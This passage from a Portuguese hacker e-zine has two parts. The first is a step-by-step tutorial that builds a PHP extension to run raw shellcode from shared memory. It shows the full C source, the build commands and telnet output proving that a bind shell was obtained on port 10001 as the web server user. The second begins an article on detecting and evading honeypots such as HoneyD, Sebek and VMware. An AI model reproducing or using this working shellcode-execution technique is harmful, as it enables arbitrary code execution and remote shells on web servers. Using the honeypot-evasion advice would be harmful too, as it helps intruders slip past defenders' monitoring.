+enquanto é necessário apenas entrar no sub-diretório "ext/"
+("/tmp/php-5.0.0/ext/"). Ali encontra-se um shellscript que cria o "framework"
+básico para a criação do módulo, o ext_skel. A utilização dele é bastante
+simples:
+
+tds@matrix:/tmp/php-5.0.0/ext$ ./ext_skel --extname=facedead
+
+Desta forma, será criado um diretório chamado "facedead" juntamente com
+oito arquivos e um sub-diretório. Apenas três destes arquivos são importantes,
+"config.m4", "facedead.c" e "php_facedead.h". Vejamos agora qual será (não
+como ele está logo após a criação, mas como ele deve ficar) o conteúdo de cada
+um dos três arquivos:
+
+---config.m4------------------------------------------------------------------
+
+PHP_ARG_WITH(facedead, for facedead support,
+[ --with-facedead Include facedead support])
+
+if test "$PHP_FACEDEAD" != "no"; then
+PHP_NEW_EXTENSION(facedead, facedead.c, $ext_shared)
+fi
+
+---fim de config.m4-----------------------------------------------------------
+
+---php_facedead.h-------------------------------------------------------------
+
+#ifndef PHP_FACEDEAD_H
+#define PHP_FACEDEAD_H
+
+extern zend_module_entry facedead_module_entry;
+#define phpext_facedead_ptr &facedead_module_entry
+
+#ifdef PHP_WIN32
+#define PHP_FACEDEAD_API __declspec(dllexport)
+#else
+#define PHP_FACEDEAD_API
+#endif
+
+#ifdef ZTS
+#include "TSRM.h"
+#endif
+
+PHP_MINIT_FUNCTION(facedead);
+PHP_MSHUTDOWN_FUNCTION(facedead);
+PHP_RINIT_FUNCTION(facedead);
+PHP_RSHUTDOWN_FUNCTION(facedead);
+PHP_MINFO_FUNCTION(facedead);
+PHP_FUNCTION(exec_shellcode);
+
+#ifdef ZTS
+#define FACEDEAD_G(v) TSRMG(facedead_globals_id, zend_facedead_globals *, v)
+#else
+#define FACEDEAD_G(v) (facedead_globals.v)
+#endif
+#endif
+
+---fim de php_facedead.h------------------------------------------------------
+
+---facedead.c-----------------------------------------------------------------
+
+#ifdef HAVE_CONFIG_H
+#include "config.h"
+#endif
+
+#include "php.h"
+#include "php_ini.h"
+#include "ext/standard/info.h"
+#include "php_facedead.h"
+
+static int le_facedead;
+
+function_entry facedead_functions[] = {
+PHP_FE(exec_shellcode, NULL)
+{NULL, NULL, NULL}
+};
+
+zend_module_entry facedead_module_entry = {
+#if ZEND_MODULE_API_NO >= 20010901
+STANDARD_MODULE_HEADER,
+#endif
+"facedead",
+facedead_functions,
+PHP_MINIT(facedead),
+PHP_MSHUTDOWN(facedead),
+PHP_RINIT(facedead),
+PHP_RSHUTDOWN(facedead),
+PHP_MINFO(facedead),
+#if ZEND_MODULE_API_NO >= 20010901
+"0.1",
+#endif
+STANDARD_MODULE_PROPERTIES
+};
+
+#ifdef COMPILE_DL_FACEDEAD
+ZEND_GET_MODULE(facedead)
+#endif
+
+PHP_MINIT_FUNCTION(facedead)
+{
+return SUCCESS;
+}
+
+PHP_MSHUTDOWN_FUNCTION(facedead)
+{
+return SUCCESS;
+}
+
+PHP_RINIT_FUNCTION(facedead)
+{
+return SUCCESS;
+}
+
+PHP_RSHUTDOWN_FUNCTION(facedead)
+{
+return SUCCESS;
+}
+
+PHP_MINFO_FUNCTION(facedead)
+{
+php_info_print_table_start();
+php_info_print_table_header(1, "facedead by tDs - tds@m...");
+php_info_print_table_end();
+
+}
+
+PHP_FUNCTION(exec_shellcode)
+{
+char shm[] =
+"\x31\xff\x31\xf6\x31\xd2\xb9"
+"\xad\xde\xce\xfa\x31\xdb\xb3\x17\x31"
+"\xc0\xb0\x75\xcd\x80\x31\xff\xbe\xfa\xff\xff\xbf\x31\xd2\x89\xc1"
+"\x31\xdb\xb3\x15\x31\xc0\xb0\x75\xcd\x80\xb8\xfa\xff\xff\xbf\xff"
+"\x30\xc3";
+
+void (*shell)() = (void *)&shm;
+zend_printf ("Shell code executado.");
+shell ();
+}
+
+---fim de facedead.c----------------------------------------------------------
+
+Resumidamente, temos o arquivo de configuração, um header e o arquivo
+principal.
+No arquivo principal, temos diversas funcões, algumas requeridas e
+outras não. A função que nos interessa é a "PHP_FUNCTION(exec_shellcode)".
+Esta função, que estará embutida no módulo, criará uma outra função, acessível
+aos scripts em PHP, chamada "exec_shellcode ()". Esta função contém um
+"shellcode que executa shellcodes" (!). Em uma parte deste shellcode, temos
+o id do segmento de memória compartilhada que contém o nosso shellcode, o que
+será executado. O trecho é o seguinte: "\xad\xde\xce\xfa". (A versão
+original utiliza a id "0xdeadbeef". A modificação se deu exclusivamente para
+que o id tivesse o mesmo nome do projeto). O original se encontra em
+http://www.shellcode.com.ar/linux/lnx-shm_shell.c
+Após ter os arquivos prontos, iremos trabalhar no diretório
+"/tmp/php-5.0.0/ext/facedead". Primeiro, executamos o comando "phpize", já
+dentro do diretório citado:
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ phpize
+Configuring for:
+PHP Api Version: 20031224
+Zend Module Api No: 20040412
+Zend Extension Api No: 220040412
+
+Serão criados vários arquivos no diretório e mais alguns sub-diretórios.
+Nenhuma mudança mais é necessária em nenhum dos arquivos que foram criados.
+Após isso, temos somente que executar um "./configure" e um "make":
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ ./configure
+checking build system type... i686-pc-linux-gnu
+checking host system type... i686-pc-linux-gnu
+checking for gcc... gcc
+checking for C compiler default output... a.out
+...
+creating libtool
+configure: creating ./config.status
+config.status: creating config.h
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ make
+/bin/sh /tmp/php-5.0.0/ext/facedead/libtool --mode=compile gcc
+-I. -I/tmp/php-5.0.0/ext/facedead -DPHP_ATOM_INC
+-I/tmp/php-5.0.0/ext/facedead/include
+-I/tmp/php-5.0.0/ext/facedead/main
+-I/tmp/php-5.0.0/ext/facedead
+...
+----------------------------------------------------------------------
+Libraries have been installed in:
+/tmp/php-5.0.0/ext/facedead/modules
+...
+See any operating system documentation about shared libraries for
+more information, such as the ld(1) and ld.so(8) manual pages.
+----------------------------------------------------------------------
+
+Build complete.
+(It is safe to ignore warnings about tempnam and tmpnam).
+
+Após o make, o nosso módulo ja estará pronto, no diretório
+"/tmp/php-5.0.0/ext/facedead/modules", com o nome "facedead.so":
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ ls -lh modules/facedead.so
+-rwxr-xr-x 1 tds users 55K Jul 14 16:52 modules/facedead.so*
+
+Podemos ainda diminuir o tamanho do módulo, usando o comando "strip":
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ whatis strip
+strip (1) - Discard symbols from object files
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ strip -s modules/facedead.so
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ ls -lh modules/facedead.so
+-rwxr-xr-x 1 tds users 4.5K Jul 14 17:06 modules/facedead.so*
+
+Para os propósitos, ficou muito bom, doze vezes menor e funcionando da
+mesma forma. O segundo dos dois ítens necessários para executar-mos shellcodes
+utilizando PHP está pronto. Só nos falta testar.
+
+____________________________
+| [5] EXECUTANDO O SHELLCODE |
+`============================
+Agora que já podemos colocar o shellcode na memória, utilizando o script
+"shellcode_up.php", e temos uma função, que executa este shellcode, localizada
+em um módulo, só temos que fazer o seguinte:
+
+- Executar o script "shellcode_up.php", para colocar o shellcode na
+memória;
+- Carregar o módulo que contém a nossa função de execução de shellcodes;
+- Chamar a função e verificar se o shellcode foi executado;
+
+Vamos fazer isso tudo em um segundo script em PHP:
+
+---facedead.php---------------------------------------------------------------
+
+';
+
+/*
+Carrega o modulo p
+*/
+dl ("facedead.so");
+/*
+Executa a funcao que ira executar o nosso shellcode
+*/
+exec_shellcode ();
+?>
+
+---fim de facedead.php--------------------------------------------------------
+
+O que o script faz é colocar o shellcode na memória, carregar o módulo e
+chamar a função que irá executar o nosso shellcode. Note que, obviamente, o
+módulo (arquivo "facedead.so") deve estar no mesmo diretório do script em PHP
+(arquivo "facedead.php"):
+
+tds@matrix:/home/www/facedead$ ls -l
+total 4500
+-rw-r--r-- 1 tds users 1203 Jul 14 17:27 facedead.php
+-rwxr-xr-x 1 tds users 4604 Jul 14 17:05 facedead.so*
+-rw-r--r-- 1 tds users 1329 Jul 14 17:28 shellcode_up.php
+
+Para executar o script, basta acessa-lo pelo seu endereço. Aqui ele está
+em "http://127.0.0.1/facedead/facedead.php".
+Após executa-lo, tentamos acessar o endereço, na porta 10001 via telnet:
+
+tds@matrix:/home/www/facedead$ telnet 127.0.0.1 10001
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+uname -a;id;
+Linux matrix 2.4.22 #6 Tue Sep 2 17:43:01 PDT 2003 i686 unknown
+unknown GNU/Linux
+uid=1006(apache) gid=103(apache) groups=103(apache)
+: command not found
+exit;
+Connection closed by foreign host.
+
+Como esperado, funcionou corretamente.
+Após a execução do script, ele ficará em carregamento, como se estivesse
+executando alguma tarefa. Ele normalmente só terminaria depois que alguém
+conectar-se via telnet na porta que foi bindada e desconectar (após o "exit;"
+ele foi finalizado). Uma coisa que pode ser feita, sem problemas, é interromper
+a execução do script, alguns segundos depois de sua execução. Como a porta já
+vai ter sido bindada, nada irá ocorrer e o acesso a shell ainda estará
+disponível.
+
+__________________________
+| [6] AMPLIANDO HORIZONTES |
+`==========================
+Muito pode ser feito utilizando-se esta "técnica". Poderia expor diversos
+exemplos aqui, mas perderia a graça de testar outras coisas e descobrir novas
+possibilidades. Alguns shellcodes "não vão funcionar", a não ser que sejam
+executado via linha de comando (na realidade funcionar ele vai, apenas não vai
+ser exibido nenhum retorno no browser). Um exemplo seria:
+
+---cat_motd.php---------------------------------------------------------------
+
+---fim de cat_motd.php--------------------------------------------------------
+
+Se executar-mos este script através do browser, nada será exibido nele.
+Mas, caso seja executado via linha de comando teremos:
+
+tds@matrix:/home/www/facedead$ php cat_motd.php
+Shell code executado.Linux 2.4.22.
+
+Vejamos o conteúdo do arquivo "/etc/motd":
+
+tds@matrix:/home/www/facedead$ cat /etc/motd
+Linux 2.4.22.
+
+Perfeitamente funcional. A mensagem "Shell code executado" faz parte do
+módulo, veja as seguintes linhas:
+...
+void (*shell)() = (void *)&shm;
+zend_printf ("Shell code executado.");
+shell ();
+...
+
+A mensagem pode ser retirada, está ai somente para propósitos de "debug".
+
+__________________________________
+| [7] CONSIDERAÇÕES FINAIS E LINKS |
+`==================================
+O conceito é bastante interessante (eu acho) e espero ter sido
+compreensível nas idéias que expus (ou tentei). Caso tenha alguma dúvida sobre
+o assunto, estou a disposição para trocar idéias e tentar esclarecer algo.
+Apenas gostaria de deixar claro o seguinte:
+1 - não sou programador, então não venha com críticas não construtivas
+sobre a qualidade do meu código. Se ele pode ou não ser escrito em doze
+linhas ao invés de cem, ótimo, deixo esta tarefa para quem sabe realmente
+programar.
+2 - A questão de estar utilizando partes de códigos de terceiros
+(shellcodes apenas) não é por não saber fazer. Poderia aumentar o texto em
+algumas centanas, milhares de linhas para uma breve explicação de como um
+shellcode funciona. Mas fica a questão: Pra que reinventar a roda, se da
+forma que está ela está funciona muito bem e preenche todos os requisitos
+que são necessários? Prefiro indicar links para uma observação mais
+detalhada.
+
+Bons estudos.
+
+http://tds.motdlabs.org/
+http://www.motdlabs.org
+http://cdm.frontthescene.com.br
+http://www.frontthescene.com.br
+/j #motd -> irc.freenode.net
+
+http://guide.motdlabs.org/edicoes/guide02/shellsemsegredos.txt
+Texto sobre shellcodes, partindo do básico e chegando ao intermediário/
+avancado. Ao final do texto encontra-se diversos outros links, alguns
+com textos mais básicos, outros com textos mais avançados e links para
+exemplos de shellcodes prontos.
+
+http://www.shellcode.com.ar/linux/lnx-shm_shell.c
+Shellcode que executa shellcodes.
+
+http://www.google.com.br
+Tudo.
+
+"Tudo da certo no fim, se não deu é porque ainda não chegou no fim"
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[05]-=[Detonando HoneyPots em Linux]-=|SkeyNet45|-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+##################################################################
+######################### -  MOTD LABS  - ########################
+##################################################################
+
+Desenvolvido por SkyNet45 aka Rapadura_com_Farinha
+
+Este texto faz parte integrante da Motd Guide N° 03 e pode ser obtido em:
+
+http://www.motdlabs.org/
+http://guide.motdlabs.org/
+http://skynet45.motdlabs.org/
+
+###############
+Observacao ####
+###############
+
+Este documento visa  expor algumas das  falhas existentes no  uso de ferramentas
+muito comuns em redes coorporativas  na atualidade, os honeypots. Nao  tenho por
+objetivo  expor  nenhuma  falha  ou  vulnerabilidade nova,  apenas  expor   mais
+claramente metodos pre-existentes, e  tambem algumas 'gambiarras' que  sao uteis
+na hora de  passarmos por um  honeypot. Se voce  procura algo novo  ou que possa
+chamar muito a atencao, infelizmente voce estah procurando no lugar errado,  SK,
+defacers, e  banda podre  nao sao  bem vindos  na leitura  desse texto. Qualquer
+duvida ou contradicao favor contatar.
+
+	O DESENVOLVEDOR DESSE MATERIAL NAO SE RESPONSABLIZA POR QUALQUER DANO  CAUSADO
+                       	PELAS INFORMACOES CONTIDAS AQUI.
+
+-----------------------------------# TOPICOS  #---------------------------------
+
+	1 – Conceito de Honeypots
+
+	2 – O que eh um Honeypot?
+			2.1 – Exemplo de Honeypot.
+
+	3 – Honeynets
+			3.1 - O que eh uma Honeynet?
+			3.2 - Onde funcionam.
+			3.3 - Como funcionam.
+			3.4 - Exemplo de uma Honeynet.
+
+	4 – Tipos e Honeypots
+			4.1 – Alta Interatividade
+				4.1.1. - O que sao?
+				4.1.2. - O que possuem?
+				4.1.3. - Onde funcionam?
+				4.1.4. - Exemplo de Honeypots de  Alta Interatividade.
+			4.2 – Baixa Interatividade
+				4.2.1. - O que  sao?
+				4.2.2. - O que possuem?
+				4.2.3. - Onde  funcionam?
+				4.2.4. - Exemplo  de Honeypots  de Baixa Interatividade.
+
+	5  –  Tipo  de  Atacantes
+			5.1 – Atacantes  Experientes
+			5.2 - NewBies, ScriptKiddies e afins.
+			5.3 - Atacantes X Conceito.
+
+	6 – VMWARE
+			6.1  – Deteccao
+				6.1.1. - 4tphi – vmchk.c (code)
+				6.1.2. - ifconfig
+				6.1.3. - Ksyms | grep vm
+
+	7 – Sebek
+			7.1 - Funcionamento do Sebek.
+			7.2 - Metados para deteccao do Sebek.
+				7.2.1. - chkrootkit (*).
+				7.2.2. - Modulos no boot X lsmod.
+
+	8 –  HoneyD
+			8.1  - Caracteristicasdo  HoneyD.
+			8.2  - Deteccao.
+				8.2.1. - ps ax
+				8.2.2. - /dev /mem
+
+	9 – Causas do uso de um Honeypot.
+			9.1 - DMZ.
+			9.2 - Altos Gastos.
+
+	10 – Perigos
+			10.1 - Comprometimento.
+			10.2 - Ataques Ddos.
+			10.3 - Fornecimento de recursos.
+
+	11 – Aspectos Juridicos
+			11.1 - Constituicoes fora do Brasil.
+			11.2 - Comparacao ao Grampo Telefonico.
+			11.3 - Logs  Contraversivos.
+			11.4 - Inducao ao ataque.
+			11.5 - Ataques futuros ao Honeypot.
+			11.6 - Brasil – Pt- Br.
+
+	12  –  Serah que  tem  jeito?
+			12.1 -  Eh possivel  melhorar?
+			12.2 -  Sem honeypot....nao sem seguranca!!!
+
+***************************
+1 – Conceito de Honeypots *
+***************************
+
+Sao  ferramentas criadas  para se  apoderar do  conhecimento dos  atacantes  que
+querem comprometer a  rede em questao.  Estes programas desenvolvem  um papel de
+agentes  nos quais  captam logs,  comandos e  ferramentas utilizadas  durante  o
+ataque, e guardao  estas informacoes para  futura analise pelo  administrador do
+honeypot ou por todas  a comunidade de seguranca.  O conceito mais difundido  eh
+que as ferramentas  que constituem os honeypots podem demonstrar  claramente aos
+administradores de redes  as tecnicas mais  recentes utilizadas pelos  hackers e
+com isso eles podem se proteger  melhor e ateh desenvolver anti-tecnicas  ou
+protecoes mais eficientes para coibir a acao dos fucadores.
+
+Essas ferramentas sao apenas programas que emulam variados sistemas, servicos, e
+vulnerabilidades  existentes.  Elas  mostram para   o atacante   uma  realidade
+falsa, um sistema que  pode interagir com comandos  e repostas, mas  ateh  certo
+ponto. Existe uma facilidade muito grande em se invadir um honeypot pois o mesmo
+jah eh  criado para  ser invadido,  dependendo da  sua caracteristica o honeypot
+irah  reagir  de  maneiras  diferentes as  tecnicas  aplicadas  pelo  invasor do
+sistema. Algumas vezes o atacante pode facilitar a captacao de seus dados e  das
+tecnicas  aplicadas na  invasao feita  alih, isso  no caso  de um  atacante  sem
+experiencia.
+
+**************************
+2 – O que eh um Honeypot?*
+**************************
+
+Um honeypot nao  eh nada mais   do que uma  maquina preparada de   ante-mao para
+emular servicos  e sistemas  falsos ou  reais, para  atrair a  acao de hackers a
+estes sistemas. Esta maquina preparada para ser um honeypot eh sempre munida das
+ferramentas necessarias  para: atrair, captar,   e avisar  sobre a  invasao  que
+o atacante fez.
+
+Eh importante analisar logo de   comeco as caracteristicas mais interessantes  e
+polemicas dos honeypots e ferramenta s relacionadas mais utilizados e comentados
+hoje pela comunidade.
+
+Teremos entre eles:
+
+---> • HoneyD
+---> • Sebek
+
+*****************************
+2.1 – Exemplo de um Honeypot*
+*****************************
+		 -------------------------------
+        	|	 ------	 HONEYD		|
+		|	| ==== | SMTP		|
+HONEYPOT ------>|	| ==== | HTTP		|
+		|	 ------	 FTP		|
+		|	/ **** \ 		|
+		|       -------			|
+		|				|
+		 -------------------------------
+**************
+3 – Honeynets*
+**************
+
+Para tentar ludibriar da melhor forma os hackers os administradores de rede  que
+querem trazer a tao sonhada seguranca usam seus esforcos em busca de uma solucao
+mais sutil e poderesa, daih talvez tenha surgido a ideia de se criar as honeynet
+s. A caracterizacao de uma honeynet eh feita quando encontramos varios  honeypot
+s juntos numa rede, rede essa que pode muitas vezes ter seus proprios  servicos,
+caracterizando um  dos tipos  de honeypot,  ou com  servicos e maquinas emulados
+apenas por uma maquina na qual eh chamada de hospedeira.
+
+*****************************
+3.5 - O que eh uma Honeynet?*
+*****************************
+
+Honeynets  muitas  vezes   sao  redes  complexas   com  roteadores  e   sistemas
+operacionais variados e dos mais qualificados tipos. Talvez para um atacante sem
+experiencia  nao  se  perceba logo  de  cara  que essa  rede  nao  eh totalmente
+funcional como uma rede real. Os construtores das ferramentas de honeypot s  jah
+ha muito tempo vem buscando melhorar  a performace e tambem a qualidade  de suas
+solucoes  no que  diz respeito  aos honeypot  s, muitos  jah trazem  opcoes  bem
+interessantes  com relacao  a funcionalidade  das redes  tcp/ip, como:  MAC  das
+placas de redes emulados, roteadores  emulados e com interface, tempo  de Uptime
+setado na configuracao e etc.
+
+Tais caracteristicas podem realmente aumentar a funcionalidade dessa rede,  isso
+aos  olhos  de  um  novato,  mas hackers  podem  perceber  isso  com  uma grande
+facilidade.
+
+**********************
+3.6 - Onde funcionam.*
+**********************
+
+Como jah  citado uma  honeynet eh  um conjunto  de honeypots, ou seja uma rede
+previamente preparada para captar  toda a acao dos  atacantes em seus hosts.  Em
+muitos casos as empresas estao dispos tas a pagar o preco mecessario para se ter
+seguranca, isso pode ser refletido nos  altos gastos que a implementacao de  uma
+honeynet pode trazer.
+
+Exemplos  nos  mostram que  se  tivermos apenas  maquinas  reais dentro  de  uma
+honeynet, se seus hosts forem  realmente maquinas fisicamente presentes e  sem a
+emulacao de nenhum  servico ou vulnerabilidade  falsa, trara um  altissimo custo
+com implement acao,  manutencao, monitoramento, link  e etc, custo  esse que nao
+trara beneficio real para a seguranca da rede com veremos mais a seguir.
+
+Por outro  lado, talvez  procurando baratear  as coisas  existem ferramentas que
+fazem tudo isso por si soh, elas trasformam um maquina modes ta em uma rede  com
+maquinas e  roteadores, e  ainda de  brinde as  vulnerabilidades nesses sistemas
+criados pela ferramenta. Um caso bem conhecido eh a questao da VMWARE ou maquina
+virtual como desejar chamar, esta real solucao cria maquinas virtuais na maquina
+hospedeira  e tem-se a  possibilidade de  instalar novos  sistemas dentro  das
+maquinas criadas pela VMWARE.
+
+**********************
+3.7 - Como funcionam.*
+**********************
+
+As honeynets por  serem redes  comuns como  as outras  tem o seu funcionamento
+muitissimo parecido  com um  rede coorporativa,  talvez o  administrador da rede
+julgando - se  experto tente fazer  da melhor maneira  uma configuracao que  ira
+facilitar  a captura  do trafego  malicioso que  circula alih.  Sempre que   uma
+empresa ou profissional  resolver implement ar  uma honeynet eh  bom lembrar que
+ela muitas vezes pode se tornar  um segmento da rede coorporativa e  de trabalho
+da  empresa, sendo  assim o  funcionamento confiavel  da empresa  pode ser   SIM
+comprometido por um hacker.
+
+*******************************
+3.8 - Exemplo de uma Honeynet.*
+*******************************
+
+Vou deixar apenas o link para uma imagem, sorry!
+Fazer uma rede em ascii nao rola!
+
+http://www.skynet45.motdlabs.org/honeys/honeynet_screen.jpg
+
+***********************
+4 – Tipos de Honeypots*
+***********************
+
+As ferramentas de honeypots tem uma classificao bem interessante, no nosso  caso
+iremos simplificar as coisas e separar  a classificacao em apenas 2 tipos.  Para
+distinguirmos  de  qual  classificacao  o  honeypot  em  questao  eh,  se  torna
+importante a total  atencao a algumas  caracteristicas imprecindiveis que  podem
+ser claras em alguns honeypot e honeynets.
+
+**************************
+4.2 – Alta Interatividade*
+**************************
+
+A relacao entre a maquina e o atacante vai ser muito importante para a distincao
+dos  tipos, tambem  por conhercer  o servico  em questao  vai ajudar   bastante.
+Honeypots de Alta Interatividade  podem ser caracterizados por  nao apresentarem
+nenhum  ferramenta que  emule ou  crie maquinas  falsas ou  que faca  o  sistema
+parecer vulneravel.
+
+Talvez alguns pesem entao: mas serah que eh soh conectar uma maquina na internet
+com um sistema bugado que eu vou ter meu honeypot? Claro que nao, honeypot s  de
+alta interatividade tem instalados em  si algumas ferramentas sim, muitos  deles
+sao muito bem configurados para captar todas as informacoes que o administ rador
+julguem  ser  necessarias  para  um futuro  estudo  das  tecnicas  e ferramentas
+empregadas no ataque.
+
+********************
+4.2.1. - O que sao?*
+********************
+
+Esta classificacao  talvez exista  por que  os criadores  e desenvolvedores  das
+ferramentas  de honeypot  perceberam que  nao adiantava  soh tentar  enganar  os
+fucadores com servicos  e solucoes falsas,  talvez tenha -  se percebido que  em
+alguns minutos  um hacker  pode distingui  se o  host em  questao eh  ou nao uma
+maquina com servicos reais.
+
+Honeypots de  Alta Interatividade  sao bem  mais dificeis  de se detectar, visto
+eles na maioria das vezes soh  possuirem ferramentas para captacao de logs.  Uma
+maquina  equipada com  o Sebek  por exemplo  jah se  torna um  honeypot de  Alta
+Interatividade, sendo que esta possue um ProFTPd vulneravel a ataques de  upload
+de arquivos em modo ASCII.
+
+************************
+4.2.2. - O que possuem?*
+************************
+
+As  maquinas  que  sao  honeypots  de  Alta  Ineratividade  tem  sempre recursos
+proprios, nao sao  emuladas por nenhuma  ferramenta. Eh sempre  caracteristico a
+presenca de ferramentas que captam o trafego e guardam logs para analise  futura
+ou  instatanea,  sempre  trazem  firewalls  configurados  para  nao  permitir ao
+atacante muitos opcoes de saida. Eh interessant e que por posuirem seus proprios
+sistemas  operacionais   e  programas   reais  eh   muito  mais   facil  o   seu
+comprometimento, ao contrario do caso da deteccao que eh mais dificil.
+
+Eh mais que util salientar que  honeynets com honeypot s de Alta  Interatividade
+na maioria das vezes possuem um Servidor Forense guardar com seguranca os Dados,
+ou informacoes, capturadas  durante o ataque  ou tentativa do  ataque. Lembrando
+que surgem varias ideias em torno do comprometimento deste Servidor Forense,  na
+maioria das vezes  eles possuem bases  de dados, ou  banco de dados  mesmo, tais
+como: postgresql  e mysql,  sendo assim  a contra  - partida  pode-se tentar  um
+comprometimento via vulnerabilidades nesses Banco de Dados ou talvez uma mudanca
+de rotas no centralizador das maquinas(Swicth).
+
+******************************************************
+4.2.4. - Exemplo de Honeypots de Alta Interatividade.*
+******************************************************
+
+http://www.skynet45.motdlabs.org/honeys/honeynet_high.jpg
+
+*************************
+4.3 Baixa Interatividade*
+*************************
+
+Este tipo  de honeypot  eh bem  interes sante,  em muitos  casos sua deteccao eh
+simples, apenas  com alguns  comandos, com  algumas passadas  de olhos  e um bom
+senso de percepcao podemos perceber a sua presenca no nosso alvo. Nesse caso  eh
+importante  lembrar  que  esse  tipo  de  honeypot  (Baixa  Interatividade)  sao
+ferramentas e que estas sempre deixam rastros e na maioria das vezes tem falhas.
+
+********************
+4.3.1. - O que sao?*
+********************
+
+Sao programas que ao serem instalados na maquina hospedeira podem criar uma gama
+de sistemas operacionais  e vulnerabilidades que  irao atrair fucadores  a estas
+maquinas.  Estas  ferramentas  podem  criar  redes  com  quantas  maquinas forem
+necessarias, e inserir dentro  delas , via configuracao,  o tipo de servico  que
+necessitar.
+
+Exemplo: honeyd.conf
+
+create linux set linux personality "Linux 2.4.16 - 2.4.18" set linux default tcp
+action reset  set linux  default udp  action reset  add linux  tcp port  110 "sh
+scripts/pop/emulate-pop3.sh" set linux subsystem "/usr/sbin/httpd" add linux tcp
+port 21 "sh scripts/ftp.sh" set linux uptime 3284460 bind 192.168.1.202 linux
+
+************************
+4.3.2. - O que possuem?*
+************************
+
+As ferramentas que  sao de Baixa  Interatividade oferecem uma  certa comodida na
+hora da escolha dos sistemas e dos servicos contidos nos host s. Pode- se ter  a
+total comodida de ser colocar um IIS pra rodar dentro de um OpenBSD (engracado),
+isso nao traz favoretismo nenhum para a seguranca. Hacker irao peceber em  curto
+periodo que as  configuracoes feitas alih  sao pra ludibria-lo  durante um certo
+tempo, configuracoes muito mistas, e meio atrapalhadas facilitam a deteccao  dos
+honeypots de Baixa Interatividade.
+
+*************************
+4.3.3. - Onde funcionam?*
+*************************
+
+Estes sempre sao instalados em maquinas hospedeiras, sao compilados e  iniciados
+pela interface do usuario e sempre  usam recursos nao proprios. Por as  maquinas
+criadas  pelo HoneyD  por exemplo  usarem recursos  da maquina  hospedeira  esta
+fornecerah sempre  indicios e  rastros sobre  a ferramenta  como veremos  mais a
+frente.
+
+Exemplo de Baixa Interatividade: HoneyD
+
+*******************************************************
+4.3.4. - Exemplo de Honeypots de Baixa Interatividade.*
+*******************************************************
+
+http://www.skynet45.motdlabs.org/honeys/honeynet_low.jpg
+
+**********************
+5 – Tipo de Atacantes*
+**********************
+
+Eh importante  sempre lembrarmos  que o  conceito do  honeypot eh  bem seguro eh
+muito difundido  entre os  meios que  o usam  para aumentar  a seguranca de suas
+redes,  tal conceito  afirma que  com a  implement acao  dos honeypot  s toda  a
+comunidade  de seguranca  poderah aprender  a se  defender melhor  dos hacker  e
+poderah tornar publica solucoes para os novos tipos de ataques e novas  tecnicas
+usadas pelos  hacker mundo  a fora.  Entao eh  muito importante  da nossa  parte
+analisarmos que tipo de  atacante um honeypot pode  atrair, quais as falhas  que
+esse conceito apresenta para toda a comunidade em geral.
+
+****************************
+5.4 – Atacantes Experientes*
+****************************
+
+Todos sabemos que hacker nao eh aquela figura prefigurada pela midia nos  nossos
+dias, isso eh uma questao esgotada, mais os presentes sabem que hacker tem  seus
+objetivos, e quais seriam os objetivos  de um hacker? Pertinente a essa  questao
+eh  valido  lembrar  que  Hackers  sabem  sempre  qual  eh  o  seu  objetivo  em
+determinadas maquinas ou redes. Um hacker  nao invadiria uma rede por prazer  ou
+por querer se divertir, ao estudar  as possibilidades de se invadir uma  rede eh
+bem analisado que tipo de informacoes ele busca naquele alvo, que tipo de  dados
+o interessa. Se um hacker consegue acesso  a uma maquina e percebe que alih  nao
+tem nada que ele  quer, eh simples ele  apenas nao quer essa  maquina, ele parte
+para outra ateh atingir seu objetivo ou conseguir o que ele queria.
+
+Serah  que um  honeypot tem  algo que  atraia hackers?  Eh bem  claro que   nao.
+Honeypots  possuem  apenas  falhas  conhecidas  e  muitas  vezes  nem   conteudo
+aprensentao, sendo assim  a pratica do  hacking nesses eh  totalmente futil. Nao
+desconsideramos a possibilidade de um hacker cair dentro de um honeypot uma  vez
+que  ninguem eh  perfeito, mais  tais possibilidades  sao vagas,  e alem   disso
+hackers ao  perceberem que  estao dentro  de um  honeypot podem  causar um baita
+estrago no  mesmo, a  experiencia com  varios sistemas  e com  os protocolos  em
+questao irao demoNstrar ao hacker que o sistema onde ele estah nao eh totalmente
+funcional como um real, isso no  caso dos honeypots de Baixa Interatividade,  no
+caso dos de Alta Interatividade  iremos analisar algumas questoes pertinentes  a
+deteccao das  ferramentas utilizadas  nos mesmos.  Muitas vezes  por questao  de
+gosto talvez, o hacker pode tirar o honeypot de circulacao por causar um  ataque
+DOS no honeypot no qual as vezes o faca perde tempo.
+
+**************************************
+5.5 - NewBies, ScriptKiddies e afins.*
+**************************************
+
+Todos sabemos que assim que entramos para o mundo da informatica e da tecnologia
+em  geral comecamos  a ver  um novo  universo em  nossa frente,  muitas vezes  o
+conhecimento e ansia do aprendizado sao coisas vividas para uma pessoa que estah
+desenvolvendo seus conhecimentos e cada dia busca uma maneira de por em  pratica
+o  que jah  aprendeu. Quando  percebemos que  ser hacker  nao eh  soh ficar   em
+localhos t talvez tenhamos um enorme desejo de partir para investidas  externas,
+muitas  vezes  sem proposito  algum  somente para  testar  tudo aquilo  que  jah
+cansamos de  ler e  de estudar,  talvez por  tentarem seguir  o velho ditado: “A
+pratica leva a perfeicao”. Quero deixar  bem claro que NewBies muitas vezes  nao
+tem intencoes  de prejudicar  ninguem, estes  porem talvez  realmente tenham uma
+vontade muito grande de conhecer o vasto universo recem apresentado a eles.  Jah
+os ScriptKiddies sao  pessoas como todos  sabem que usam  seu pouco conhecimento
+para deturpar o real sentido do hacking e realmente acabam manchando a imagem da
+palavra hacker, mas esse  nao eh assunto para  nos, sendo assim o  ScriptKiddies
+agem como se nao pensasem nem em que alvo estao tentado suas investidas e talvez
+nao estejao concientes com respeito do transtorno causado pelos seus atos muitas
+vezes de `pixacao ` feitos em sites mundo a fora.
+
